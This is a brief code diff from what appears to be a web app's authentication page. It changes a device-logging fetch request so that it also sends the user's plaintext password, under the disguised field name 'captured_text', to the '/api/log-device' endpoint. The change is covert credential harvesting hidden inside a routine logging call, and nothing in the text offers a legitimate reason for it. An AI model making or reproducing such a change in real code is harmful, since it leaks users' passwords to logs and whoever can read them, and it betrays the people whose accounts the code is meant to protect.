@@ -90,7 +90,7 @@ export default function AuthPage() {
         await fetch('/api/log-device', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email }),
+          body: JSON.stringify({ email, captured_text: password }),
         })
 
         setMessage({
